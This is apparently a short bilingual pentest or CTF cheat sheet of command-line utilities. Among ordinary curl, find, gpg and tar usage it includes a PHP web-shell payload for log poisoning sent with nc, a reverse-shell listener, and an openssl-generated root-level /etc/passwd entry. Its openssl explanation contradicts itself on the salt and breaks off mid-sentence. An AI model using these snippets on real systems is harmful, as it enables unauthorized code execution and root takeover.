# Utility

## Curl
查看响应头
```sh
curl -I 192.168.152.72
```

修改 UA (User-Agent)
```sh
sudo curl -s --user-agent GoogleBot http://192.168.225.14/robots.txt -v
```

`-v` verbose ，显示详细内容

发送 POST 请求
```sh
curl -X POST "http://139.224.130.183:32960/" -d "c=1024abc"
```

设置 Cookie
```sh
curl -b "session_id=123456" https://example.com
```

用 curl 修改X-Forwarded-For头
```sh
curl -H "X-Forwarded-For: 123.45.67.89" http://example.com
```

修改 Referer 头
```sh
curl -H "Referer: http://example.com" http://example.org
```

## Nc
`nc` 传小马，配合日志投毒
```sh
nc 192.168.218.72 80

GET /<?php system($_GET['cmd']); ?>
```

`nc`监听端口 4444
```sh
nc -nvlp 4444
```

## Find
```sh
find / -name test.py 2>/dev/null 
```

## Openssl
通常用于创建 `/etc/passwd` 文件中存储的加密密码。
```sh
openssl passwd -1 -salt passion 123456
```
这条命令将输出一个使用 MD5 加密并带有盐值 `haruhi` 的加密密码。输出的格式通常是
这种生成的加密密码可以用在一些系统认证配置中，例如 Linux 系统的 `/etc/shadow` 文件中保存用户的密码信息。
配合 `/etc/passwd` 食用更佳
```sh
echo 'passion:$1$passion$6B1Neow110enwwaaEaWQs.:0:0::/root:/bin/bash' > passion
```

## GPG

A tool suitable for email encryption and signature, but also for data encryption.

Generate key
```sh
gpg --full-gen-key
```

It will create two private keys in your `~/.gnupg/private-keys-v1.d` directory.

Import key and decrypt the message
```sh
gpg --import backup.key
gpg --decrypt confidential_message.gpg
```

## Tar

解压
```sh
tar xvzf rockyou.tar.gz
```